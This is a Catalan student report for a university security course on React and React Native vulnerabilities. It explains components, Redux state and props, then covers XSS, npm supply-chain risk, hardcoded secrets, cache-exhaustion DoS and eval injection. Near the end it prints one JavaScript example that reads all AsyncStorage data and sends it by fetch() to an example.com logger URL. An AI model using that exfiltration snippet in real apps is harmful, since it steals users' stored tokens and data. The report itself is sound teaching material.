---
title: "React Vulnerabilities"
author: [Marc Sànchez Pifarré, GEINF (UDG-EPS)]
date: 08/01/2020
subject: "Udg - Eps"
tags: [Seguretat i protecció de dades]
subtitle: "Tutor de la pràctica : Antonio Bueno"
titlepage: true
titlepage-color: 3C9F53
titlepage-text-color: FFFFFF
titlepage-rule-height: 4
...


\setlength{\emergencystretch}{3em}  % prevent overfull lines
\newpage

# Objectius

- Funcionament del React
- Vulnerabilitats de React en general
- Vulnerabilitats de React Native

# Introducció

Per poder parlar sobre vulnerabilitats sobre un sistema és imprescindible conèixer com funciona aquest sistema. Per aquest motiu abans d'entrar en detalls sobre possibles errades de seguretat crec convenient explicar les bases del funcionament de una aplicació react. 

En aquest document es parlarà de React anomenant-lo framework ja que té moltes similituds amb la definició de framework però voldria deixar clar que reactjs **no és un framework**, és un conjunt de llibreries que aporten funcionalitat extra al llenguatge de programació javascript. En general cada llibreria és un conjunt d'instruccions en javascript. 

S'ha de tenir en compte també que les noves versions de javascript incorporen molt de codi asíncron i que la majoria d'accions poden ser programades de manera concurrent. És un ús molt habitual de les noves versions dels llenguatges de programació, facilita l'atomització de les accions en mètodes que poden executar-se en paral·lel per així aprofitar en la seva totalitat el potencial de la màquina.

# Javascript

Javascript no és un llenguatge orientat a objectes i aquest fet ens pot jugar en contra a l'hora de protegir accessos a memòria de l'aplicació, en llenguatges de programació com Java o C# els accessos als objectes estan gestionats a partir del propi llenguatge de programació. Juntament amb els accessos hi ha una important desaventatge referent a la programació orientada a objectes, i és que en javascript és més fàcil que el codi "vingui brut", és a dir, perdre la consistència del disseny. Aquest fet pot propiciar que a la llarga, desenvolupaments que ja han estat validats quedin desprotegits degut al mal ús del programari. 

# Com funciona react (JSX)

React és un conjunt de llibreries de desenvolupament programades en javascript. ReactJS està pensat per el desenvolupament d'interfícies d'usuari. Està mantingut per Facebook però el seu codi és opensource i també hi colaboren desenvolupadors a nivell individual de tot el món. 

El funcionament d'una aplicació react és mitjançant la descàrrega d'una aplicació (web o nativa) feta "en essència" en javascript, més endavant ja es desvelarà per què es diu "en essència", a una màquina client per poder ser utilitzada independentment del servidor (a nivell de funcionalitat). Aquest fet s'ha desenvolupat així com a millora del món del desenvolupament pensant en microserveis. 

Es separa completament la interfície d'usuari de les dades fent que el sistema d'usuari sigui totalment autònom i que gestioni per complert la sol·licitació de les mateixes en els diferents moments que ho requereixi. La sol·licitud es gestiona a partir de la capa d'aplicació sobre el protocol http/s. Normalment 
es fan servir API web services o fins i tot es podria utiltizar connexions web socket també sobre http/s. 

la construcció de les aplicacions react tant de mòbil com web utilitzen la mateixa metodologia de desenvolupament tal com es comentarà més endavant a l'apartat **"Objectes importants"**. 

## Gestor de paquets

Npm [2] és el gestor de paquets per excel·lència de javascript. Aquí s'hi poden trobar tots els components necessaris per poder desenvolupar funcionalitats dins de la nostre app, ja sigui web o nativa. 

## Patró principal del llenguatge de programació. 

React es basa en el patró de desenvolupament anomenat composite [3]. Aquest patró pren com estandard l'anomenat divideix i venç, la idea principal és dividir les funcionalitats més bàsiques i aïllables en mòduls que a la seva vegada son utilitzats per altres mòduls que els componen. Així doncs, es genera un arbre de dependències molt clar peró a la vegada perillós. Aquest concepte és clau a l'hora de parlar dels objectes importants i les seves característiques que poden fer-los vulnerables. 


![Composite pattern diagram](./img/composite_pattern.png){ width=350px}

Com podem apreciar en el diagrama planteja l'esquema d'un arbre.

## Objectes importants

En el desenvolupament de react hi aparèixen certs actors imprescindibles per el seu funcionament. El patró composite permet que la creació de les pàgines sigui àgil i que els components no depenguin els uns dels altres. Així mateix permet que els components tinguin l'habilitat d'executar codi javascript des de les fulles de l'arbre de dependències. 

**Tots els objectes presentats a continuació existeixen tant en el desenvolupament d'aplicacions web com en el desenvolupament d'aplicacions natives.**

### Components

Els components son el què en POO s'anomenen objectes. React aplica una capa per sobre de javascript i gestiona certs fitxers amb una estructura concreta com si fossin objectes, la diferència principal amb un llenguatge de programació a objectes és la consistència que t'aporta i l'accés als recursos de memòria privats. ReactJS s'executa en un navegador o en una aplicació mòbil, en el cas de l'aplicació com ja explicarem més endavant, la gestió d'aquesta protecció es deriva al sistema operatiu peró en cas d'una web, la gestió sobre l'accés als recursos de memòria de react els gestiona el mateix navegador amb el risc que aixó comporta.

Així mateix un exemple d'un component react pot ser qualsevol conjunt d'elements html o de vistes en android que componguin aquest component. 

En instagram, cada una de les publicacions d'instagram son components que es mostren dins d'un component llista. I cada component publicació té components interns com pot ser el share, els like (actualment ja morts), entre altres.

### State (redux)

React empra l'ús de redux [4] per a la gestió del que s'anomena l'estat. El concepte d'estat surt primàriament del concepte de màquina d'estats. Hem de visualitzar cada component descrit en l'apartat anterior com una màquina d'estats on l'interacció amb aquest component des dels múltiples punts d'interacció pot alterar aquest estat i fer que la màquina viatgi a l'estat següent provocant canvis en la visualització del mateix. 

L'estat és un dels punts crítics en la seguretat i la protecció de dades sensibles d'una aplicació feta en react però lligat amb un mal disseny en la obtenció de les dades. Com s'ha comentat anteriorment les dades de l'aplicatiu no han d'estar a la aplicació client sinó que l'aplicació client ha d'anar a buscar-les mitjançant una API Rest, GraphQL, SOAP o un web socket allà on siguin mitjançant la deguda autenticació si és que fa falta. 

L'espai de memòria destinat a fer perdurar aquestes dades que ha recuperat dins del navegador al llarg del temps és l'estat. Així doncs si l'accés a aquestes dades fa que s'exposin dades d'altres clients o dades sensibles degut a una mala programació i disseny de l'aplicatiu i el seu sistema, l'estat és el punt atacable. 

### Props

Cada component per poder funcionar requereix de paràmetres, com a mínim requereix el paràmetre estat generat per el component pare App(), punt d'entrada de l'aplicació. Aquests paràmetres s'anomenen props i es defineixen com un objecte json, quan el component pare les reb s'inicialitzen i tot seguit, per cada component intern se li assignen aquestes props. Tots els components tenen el mateix comportament i per tant les props acaben viatjant des de la part superior de l'arbre fins a les fulles. 

A l'objecte props s'hi poden assignar tant valors, com altres objectes, com funcions. Aquesta és una de les virtuds del Javascript, i és que permet la creació de funcions d'ordre superior. En general s'utilitza la tècnica de single source of truth [6] que permet tenir molts components que estan compartint un únic estat. 


### Lifecycle

ReactJS així com tots els UI frameworks utilitza el que s'anomena un cicle de vida. El cicle de vida es posa en marxa quan es sol·licita la creació d'un component, en aquest moment s'entra a la inicialització on es crea l'objecte estat i es generen les anomenades props. El el següent diagrama s'escenifica amb claretat els diferents mètodes que s'executen per cada component de react. 

![React Lifecycle](./img/lifecycle.png){ width=350px }

Per defecte cada una d'aquestes funcions no actúen, simplement es criden, el component super() que és el pare genèric de tots els components cedeix la interfície sobre la qual s'implementa el cicle de vida per tal que tots els components sobreescriguin els mètodes i realitzin al seu interior totes les accions que considerin oportunes. 

La funció render és la més important, ja que és on s'executa el codi JSX [5], llenguatge de templates utiltizat per react. Aquesta funció és executada no només en el cicle de vida de la creació, també en els cicles de vida d'actualització, tant si es canvia el valor de les props com si es canvia el valor de l'estat. 

# Vulnerabilitats 

Tenint en compte que ara ja sabem com actúa react, ja podem parlar més concretament de vulnerabilitats lligades a aquest sistema. Aquestes vulnerabilitats no només estan subjectes a aplicacions web sinó també a les aplicacions react-native. Per definició, react deixa poques portes obertes, però per molt consistent i seguir que es vulgui crear un software, quan passa per les mans dels programadors, sempre té possibilitats de tornar-se insegur. El bad coding és un fet. 

Hi ha diferents punts a tenir en compte quan es parla de vulnerabilitats del react, en general ens centrarem en react-native ja que és el target del treball. El react native no només serveix per implementar o desenvolupar aplicacions mòbil, sinó que també serveix per implementar aplicacions web, és per aquest motiu pel que pot ser que alguna de les vulnerabilitats explicades a continuació afecti directament al món web. 

## Redux

Redux és un component molt important al parlar de react, de fet és la part que controla l'estat de l'aplicació i en conseqüència, qui controla els accessos a memòria i qui fa de pont entre els objectes i els seus valors amb els components que es renderitzen. 

Podem consultar els issues de redux aquí : [https://snyk.io/vuln/npm:redux](https://snyk.io/vuln/npm:redux). 

Com podem veure en l'anterior link redux no ha tingut cap issue de seguretat des de la seva creació, cosa que no significa que no en tingui, sinó que significa que ningú n'ha descobert. Aquest és un punt a favor de react natiu. Si es vol saber més informació sobre com funciona redux es pot visitar la seva documentació oficial [7] o llegir aquest artícle [https://blog.usejournal.com/how-does-redux-work-b1cce46d4fa6](https://blog.usejournal.com/how-does-redux-work-b1cce46d4fa6).

## XSS or injecting child nodes

La manera clàssica de poder fer XSS és utilitzant la funció `dangerouslySetInnerHTML`. Totalment desaconsellada! 

Tal com s'ha comentat anteriorment react native també està pensat per desenvolupar aplicacions web i per tant farem un petit incís sobre el cross site scripting. Amb react natiu estem molt protegits contra el clàssic XSS. Totes les possibles combinacions de caràcters que puguin ser entrats en un formulari, react les té en compte i les escapa i les tracta com ha de tractar-les. De fet té tota la coherència del món ja que és un llenguatge que està dissenyat per a interfícies. 

Peró se li escapa quelcom important! Ja no parlem del típic XSS en web sinó un XSS adaptat a react. I és que, si sabem que redera de una app hi ha react podem actuar diferent. En definitiva el que es pot fer és actuar contra el render del react. En concret, react escapa tots els caràcters que formen part de qualsevol cadena i els tracta de manera aïllada, peró, i si el que se li passa no és una cadena de caràcters? per exemple, un objecte json... { obj:"valor"}, en aquest moment react genera un element span on el id de l'element hi ha l'id de la clau de l'objecte json, en aquest cas obj. 

```
<span id="obj">valor</span>
```

No és ben bé així però fa quelcom similar. 

En aquest punt ja veiem que react està processant directament la clau de l'objecte json, en aquest cas ja ho tenim, només hem de canviar la clau per quelcom que volguem que sigui processat. Evidentment aquesta vulnerabilitat de XSS és adaptada per aquest framework i implica que qui està programant és un sapastre de cuidado. 

Per què aquesta vulnerabilitat tingui efecte s'hauria de passar l'entrada d'un input directament a un render sense passar cap procés. 

Podem consultar la font on s'explica la vulnerabilitat a la referència [8]. L'artícle és del 2015 i no es parla sobre la versió de react, aquest problema es va solventar tal i com s'explica a la referència [10]. 

## Plain Javascript

Com ja s'ha comentat a classe en repetides ocasions, si un framework et dóna la possibilitat de fer una cosa, no intentis fer-la pel teu compte, en aquest cas amb javascript pur. Si ho fas, segurament provocaràs issues de seguretat que el mateix framework ja té en compte. Aquest fet serveix tant per web com per android com per ios, ja que el què fa directament el react natiu és la traducció del javascript a les instruccions java, kotlin o swift que es requereixin per realitzar l'acció. Llavors implementar javascript pur pot causar que el programa no compili, o que si compila, tingui greus errades de traducció i el comportament de la app no sigui l'esperat. 

## NPM

Npm és el gestor de paquets i de dependències de javascript que és utilitzat per molts frameworks. En general NPM no té per què provocar un issue de seguretat a la nostre aplicació ja que simplement gestiona les actualitzacions dels paquets externs de l'aplicació, consulta les versions i si alguna de les versions que s'estan fent servir estan obsoletes ho notifica per què es puguin actualitzar. Simplement amb la instrucció `npm audit fix`. 

El problema de npm llavors no és npm en sí, sinó els paquets que s'utilitzen. Suposem que es vol incorporar un tema a la nostre aplicació, consultem npm i veiem que hi ha un paquet, el tema visual del qual és molt bonic i volem incorporar-lo a la nostre app. A priori no tenim idea de com està creat aquest tema visual i pot ser que els mateixos paquets incorporin javascript pur que provoqui errades de seguretat o mal funcionament de l'aplicació. 

Npm revisa les versions dels paquets que s'utilitzen a la app i les compara amb el seu repositori. Aconseguir modificar el repositori de paquets de npm (la url) del mateix pc del programador també pot ser un gran problema. 

## Bad coding

Hem de tenir en compte en tot moment que estem programant la part client de una aplicació, ja sigui mòbil o web. Aixó significa que el codi de l'aplicació acabarà en mans de la gent, per tant en aquest codi no hi pot haver absolutament res hardcoded. Fer aquesta pràxis en una app client és, com diu el professor de seguretat, game over. 

A part, el patró composite fa molt fàcil que la nostre aplicació sigui dividida en parts petites. Mostrar o amagar aquestes parts és una de les ventatges de la programació en react peró també és un punt feble. React empaqueta l'aplicació sencera i la distribueix en una versió compilada, aixó significa que si la nostre app conté rols (usuaris que poden tenir o no privilegis), totes les vistes dels rols s'envien a tots!! 

És un perill?? Doncs depenent de com es programi. Hi ha parts importants a tenir en compte : 

- L'aplicació interfície no ha de contenir cap tipus d'informació, l'ha de rebre tota de servidor.
- Matriu d'accessos del sistema [9], de cares al servidor, tot usuari ha de tenir accés limitat a les seves **accions**. 

## Denial of service

React utilitza un paquet anomenat mem per gestionar la memòria cau de l'aplicació. De fet és una tècnica optimitzada que permet incrementar la velocitat de lectura i de query cachejant els resultats de les crides a web service. Fins aquí molt bé, però i la quantitat de memòria que necessiten les crides? 

El problema rau en la incertesa del tamany de la informació que rebrem. L'aplicació en react native o en web browser té un espai de memòria finit, ja sigui degut a altres aplicacions en marxa o per què fisicament el dispositiu no dóna per més. Llavors el problema està directament en què si les crides retornen molta informació la memòria cau s'emplena, comencen a haver-hi fallades de memòria, aquesta informació passa de cau a ramm per que entri la nova que també és requerida per el funcionament i que torna a entrar en cau fent que l'altre informació passi a ramm i creant així un bucle que provoca un DoS. El problema està molt més documentat i fonamentat, jo he intentat resumir-lo amb paraules que considero que no son tècniques. En general el problema és un sobreeiximent de la caché. 

És una vulnerabilitat a tenir en compte ja que hi ha moltes aplicacions que permeten configurar les fonts d'informació amb les que volen treballar. Com a curiositat, Discord, una app que permet la interacció entre jugadors mentre juguen a jocs online i creada en React Native ha patit les conseqüències del memory leak, veure [12].

## React Native

Ja que react native és un framework que mapeja directament els objectes javascript en els mateixos del sistema ios o android amb els que s'estigui desenvolupant, no existeix el món web, i per tant no existeix el XSS, no existeix tampoc HTML. Per tant es podria **intentar** dir que react native aplicat a aplicacions mòbils no té cap tipus de vulnerabilitat, peró seria mentida! 

Si bé és cert que al no tenir html no hi ha la creació dinàmica de components, no hi ha XSS i HTML no existeix. Tal com es comenta a [11] sí que es podria arribar a injectar codi a una app react native utilitzant la instrucció eval(). De totes formes aquest tipus de vulnerabilitat ha estat explicada a la secció javascript pur d'aquest document i es consideraria bad programming.  

Un exemple en el que s'aconsegueix accedir a la informació del Async storage (espai compartit on es pot desar informació en el client) i publicar-la.

```
_reactNative.AsyncStorage.getAllKeys(
    function(err,result){
        _reactNative.AsyncStorage.multiGet(result, function(err,result){
            fetch(‘http://example.com/logger.php?token='+JSON.stringify(result));
        });
    }
);
```

# Conclusions

El gran problema de react native no és react native en sí, sinó que qualsevol tipus d'atac que existeixi en un entorn android o ios, serà també un problema per una aplicació react native, ja que, evidentment es fa la traducció del javascript a el llenguatge natiu a l'hora de compilar, i per tant s'acaba tenint una app mòbil com una altre. 

No es pot programar sense por a ser hackejat. Sempre has de ser el més paranoic del pati i has d'estar al dia dels possibles problemes que s'han anat trobant els demés, sobretot per què el més important és programar bé. Si es programa bé estàs menys exposat, com s'ha anat comentant gran part dels problemes de seguretat no estan en el mateix codi sinó que estan en la manera de programar de la gent. 

**Com ja he comentat anteriorment, el bad programming és un fet. I com comento en aquest moment, jo també faig bad programming, fins que me n'adono de que l'estic fent**.

*Documentation written in Markdown and rendered with pandoc!*

Visit my github project related to this document! -> https://github.com/raikkon88/react-vulnerabilities

# References 

- [1] - [ReactJS] -> [https://es.reactjs.org/](https://es.reactjs.org/)
- [2] - [NPM] -> [https://www.npmjs.com/](https://www.npmjs.com/)
- [3] - [Composite pattern] -> [https://es.wikipedia.org/wiki/Composite_(patr%C3%B3n_de_dise%C3%B1o)](https://es.wikipedia.org/wiki/Composite_(patr%C3%B3n_de_dise%C3%B1o))
- [4] - [Redux] -> [https://es.redux.js.org/](https://es.redux.js.org/)
- [5] - [JSX] -> [https://es.reactjs.org/docs/introducing-jsx.html](https://es.reactjs.org/docs/introducing-jsx.html)
- [6] - [Single source of truth] -> [http://www.hackingwithreact.com/read/1/12/state-and-the-single-source-of-truth](http://www.hackingwithreact.com/read/1/12/state-and-the-single-source-of-truth)
- [7] - [Redux Documentation](https://redux.js.org/introduction/getting-started)
- [8] - [XSS over REACT](http://danlec.com/blog/xss-via-a-spoofed-react-element)
- [9] - [Base dels models de seguretat - Antonio Bueno, Diapositives teoria 6-nov](https://bcds.udg.edu/docencia/geinf_gddv_seguretat/geinf_seguretat_sessio1_6nov.pdf?u=1939705)
- [10] - [Injecting child nodes (medium)](https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1#a51f)
- [11] - [How About React Native?](https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1#7e17)
- [12] - [Discord's memory leak](https://blog.discordapp.com/discord-react-memory-leak-565c89763e8)